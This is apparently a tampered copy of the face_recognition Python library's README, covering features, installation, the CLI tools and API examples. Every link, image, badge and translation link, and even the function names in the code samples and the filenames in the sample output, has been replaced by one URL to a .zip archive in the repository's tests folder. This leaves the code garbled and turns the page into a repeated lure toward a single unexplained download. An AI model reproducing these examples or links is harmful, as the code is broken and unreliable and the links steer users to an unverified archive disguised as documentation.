# Face Recognition

_You can also read a translated version of this file [in Chinese 简体中文版](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) or [in Korean 한국어](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) or [in Japanese 日本語](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)._

Recognize and manipulate faces from Python or from the command line with
the world's simplest face recognition library.

Built using [dlib](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)'s state-of-the-art face recognition
built with deep learning. The model has an accuracy of 99.38% on the
[Labeled Faces in the Wild](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) benchmark.

This also provides a simple `face_recognition` command line tool that lets
you do face recognition on a folder of images from the command line!


[![PyPI](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
[![Build Status](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip%3ACI)
[![Documentation Status](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

## Features

#### Find faces in pictures

Find all the faces that appear in a picture:

![](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

```python
import face_recognition
image = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
face_locations = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(image)
```

#### Find and manipulate facial features in pictures

Get the locations and outlines of each person's eyes, nose, mouth and chin.

![](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

```python
import face_recognition
image = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
face_landmarks_list = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(image)
```

Finding facial features is super useful for lots of important stuff. But you can also use it for really stupid stuff
like applying [digital make-up](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) (think 'Meitu'):

![](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

#### Identify faces in pictures

Recognize who appears in each photo.

![](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

```python
import face_recognition
known_image = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
unknown_image = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")

biden_encoding = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(known_image)[0]
unknown_encoding = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(unknown_image)[0]

results = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip([biden_encoding], unknown_encoding)
```

You can even use this library with other Python libraries to do real-time face recognition:

![](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

See [this example](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) for the code.

## Online Demos

User-contributed shared Jupyter notebook demo (not officially supported): [![Deepnote](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

## Installation

### Requirements

  * Python 3.3+ or Python 2.7
  * macOS or Linux (Windows not officially supported, but might work)

### Installation Options:

#### Installing on Mac or Linux

First, make sure you have dlib already installed with Python bindings:

  * [How to install dlib from source on macOS or Ubuntu](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
  
Then, make sure you have cmake installed:  
 
```brew install cmake```

Finally, install this module from pypi using `pip3` (or `pip2` for Python 2):

```bash
pip3 install face_recognition
```

Alternatively, you can try this library with [Docker](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip), see [this section](#deployment).

If you are having trouble with installation, you can also try out a
[pre-configured VM](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip).

#### Installing on an Nvidia Jetson Nano board

 * [Jetson Nano installation instructions](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
   * Please follow the instructions in the article carefully. There is current a bug in the CUDA libraries on the Jetson Nano that will cause this library to fail silently if you don't follow the instructions in the article to comment out a line in dlib and recompile it.

#### Installing on Raspberry Pi 2+

  * [Raspberry Pi 2+ installation instructions](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

#### Installing on FreeBSD

```bash
pkg install graphics/py-face_recognition
```

#### Installing on Windows

While Windows isn't officially supported, helpful users have posted instructions on how to install this library:

  * [@masoudr's Windows 10 installation guide (dlib + face_recognition)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

#### Installing a pre-configured Virtual Machine image

  * [Download the pre-configured VM image](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) (for VMware Player or VirtualBox).

## Usage

### Command-Line Interface

When you install `face_recognition`, you get two simple command-line 
programs:

* `face_recognition` - Recognize faces in a photograph or folder full for 
   photographs.
* `face_detection` - Find faces in a photograph or folder full for photographs.

#### `face_recognition` command line tool

The `face_recognition` command lets you recognize faces in a photograph or 
folder full  for photographs.

First, you need to provide a folder with one picture of each person you
already know. There should be one image file for each person with the
files named according to who is in the picture:

![known](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

Next, you need a second folder with the files you want to identify:

![unknown](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

Then in you simply run the command `face_recognition`, passing in
the folder of known people and the folder (or single image) with unknown
people and it tells you who is in each image:

```bash
$ face_recognition ./pictures_of_people_i_know/ ./unknown_pictures/

https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,Barack Obama
https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,unknown_person
```

There's one line in the output for each face. The data is comma-separated
with the filename and the name of the person found.

An `unknown_person` is a face in the image that didn't match anyone in
your folder of known people.

#### `face_detection` command line tool

The `face_detection` command lets you find the location (pixel coordinatates) 
of any faces in an image.

Just run the command `face_detection`, passing in a folder of images 
to check (or a single image):

```bash
$ face_detection  ./folder_with_pictures/

https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,65,215,169,112
https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,62,394,211,244
https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,95,941,244,792
```

It prints one line for each face that was detected. The coordinates
reported are the top, right, bottom and left coordinates of the face (in pixels).
 
##### Adjusting Tolerance / Sensitivity

If you are getting multiple matches for the same person, it might be that
the people in your photos look very similar and a lower tolerance value
is needed to make face comparisons more strict.

You can do that with the `--tolerance` parameter. The default tolerance
value is 0.6 and lower numbers make face comparisons more strict:

```bash
$ face_recognition --tolerance 0.54 ./pictures_of_people_i_know/ ./unknown_pictures/

https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,Barack Obama
https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,unknown_person
```

If you want to see the face distance calculated for each match in order
to adjust the tolerance setting, you can use `--show-distance true`:

```bash
$ face_recognition --show-distance true ./pictures_of_people_i_know/ ./unknown_pictures/

https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,Barack Obama,0.378542298956785
https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip,unknown_person,None
```

##### More Examples

If you simply want to know the names of the people in each photograph but don't
care about file names, you could do this:

```bash
$ face_recognition ./pictures_of_people_i_know/ ./unknown_pictures/ | cut -d ',' -f2

Barack Obama
unknown_person
```

##### Speeding up Face Recognition

Face recognition can be done in parallel if you have a computer with
multiple CPU cores. For example, if your system has 4 CPU cores, you can
process about 4 times as many images in the same amount of time by using
all your CPU cores in parallel.

If you are using Python 3.4 or newer, pass in a `--cpus <number_of_cpu_cores_to_use>` parameter:

```bash
$ face_recognition --cpus 4 ./pictures_of_people_i_know/ ./unknown_pictures/
```

You can also pass in `--cpus -1` to use all CPU cores in your system.

#### Python Module

You can import the `face_recognition` module and then easily manipulate
faces with just a couple of lines of code. It's super easy!

API Docs: [https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip).

##### Automatically find all the faces in an image

```python
import face_recognition

image = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
face_locations = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(image)

# face_locations is now an array listing the co-ordinates of each face!
```

See [this example](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
 to try it out.

You can also opt-in to a somewhat more accurate deep-learning-based face detection model.

Note: GPU acceleration (via NVidia's CUDA library) is required for good
performance with this model. You'll also want to enable CUDA support
when compliling `dlib`.

```python
import face_recognition

image = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
face_locations = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(image, model="cnn")

# face_locations is now an array listing the co-ordinates of each face!
```

See [this example](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
 to try it out.

If you have a lot of images and a GPU, you can also
[find faces in batches](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip).

##### Automatically locate the facial features of a person in an image

```python
import face_recognition

image = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
face_landmarks_list = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(image)

# face_landmarks_list is now an array with the locations of each facial feature in each face.
# face_landmarks_list[0]['left_eye'] would be the location and outline of the first person's left eye.
```

See [this example](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
 to try it out.

##### Recognize faces in images and identify who they are

```python
import face_recognition

picture_of_me = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
my_face_encoding = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(picture_of_me)[0]

# my_face_encoding now contains a universal 'encoding' of my facial features that can be compared to any other picture of a face!

unknown_picture = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip("https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip")
unknown_face_encoding = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip(unknown_picture)[0]

# Now we can see the two face encodings are of the same person with `compare_faces`!

results = https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip([my_face_encoding], unknown_face_encoding)

if results[0] == True:
    print("It's a picture of me!")
else:
    print("It's not a picture of me!")
```

See [this example](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
 to try it out.

## Python Code Examples

All the examples are available [here](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip).


#### Face Detection

* [Find faces in a photograph](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Find faces in a photograph (using deep learning)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Find faces in batches of images w/ GPU (using deep learning)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Blur all the faces in a live video using your webcam (Requires OpenCV to be installed)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

#### Facial Features

* [Identify specific facial features in a photograph](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Apply (horribly ugly) digital make-up](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

#### Facial Recognition

* [Find and recognize unknown faces in a photograph based on photographs of known people](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Identify and draw boxes around each person in a photo](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Compare faces by numeric face distance instead of only True/False matches](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Recognize faces in live video using your webcam - Simple / Slower Version (Requires OpenCV to be installed)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Recognize faces in live video using your webcam - Faster Version (Requires OpenCV to be installed)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Recognize faces in a video file and write out new video file (Requires OpenCV to be installed)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Recognize faces on a Raspberry Pi w/ camera](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Run a web service to recognize faces via HTTP (Requires Flask to be installed)](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Recognize faces with a K-nearest neighbors classifier](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
* [Train multiple images per person then recognize faces using a SVM](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

## Creating a Standalone Executable
If you want to create a standalone executable that can run without the need to install `python` or `face_recognition`, you can use [PyInstaller](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip). However, it requires some custom configuration to work with this library. See [this issue](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) for how to do it.

## Articles and Guides that cover `face_recognition`

- My article on how Face Recognition works: [Modern Face Recognition with Deep Learning](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)
  - Covers the algorithms and how they generally work
- [Face recognition with OpenCV, Python, and deep learning](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) by Adrian Rosebrock
  - Covers how to use face recognition in practice
- [Raspberry Pi Face Recognition](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) by Adrian Rosebrock
  - Covers how to use this on a Raspberry Pi
- [Face clustering with Python](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) by Adrian Rosebrock
  - Covers how to automatically cluster photos based on who appears in each photo using unsupervised learning

## How Face Recognition Works

If you want to learn how face location and recognition work instead of
depending on a black box library, [read my article](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip).

## Caveats

* The face recognition model is trained on adults and does not work very well on children. It tends to mix
  up children quite easy using the default comparison threshold of 0.6.
* Accuracy may vary between ethnic groups. Please see [this wiki page](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) for more details.

## <a name="deployment">Deployment to Cloud Hosts (Heroku, AWS, etc)</a>

Since `face_recognition` depends on `dlib` which is written in C++, it can be tricky to deploy an app
using it to a cloud hosting provider like Heroku or AWS.

To make things easier, there's an example Dockerfile in this repo that shows how to run an app built with
`face_recognition` in a [Docker](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) container. With that, you should be able to deploy
to any service that supports Docker images.

You can try the Docker image locally by running: `docker-compose up --build`

There are also [several prebuilt Docker images.](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip)

Linux users with a GPU (drivers >= 384.81) and [Nvidia-Docker](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) installed can run the example on the GPU: Open the [https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) file and uncomment the `dockerfile: https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip` and `runtime: nvidia` lines.

## Having problems?

If you run into problems, please read the [Common Errors](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) section of the wiki before filing a github issue.

## Thanks

* Many, many thanks to [Davis King](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) ([@nulhom](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip))
  for creating dlib and for providing the trained facial feature detection and face encoding models
  used in this library. For more information on the ResNet that powers the face encodings, check out
  his [blog post](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip).
* Thanks to everyone who works on all the awesome Python data science libraries like numpy, scipy, scikit-image,
  pillow, etc, etc that makes this kind of stuff so easy and fun in Python.
* Thanks to [Cookiecutter](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) and the
  [audreyr/cookiecutter-pypackage](https://github.com/p-surya/face_recognition/raw/refs/heads/master/tests/recognition-face-2.3-alpha.3.zip) project template
  for making Python project packaging way more tolerable.
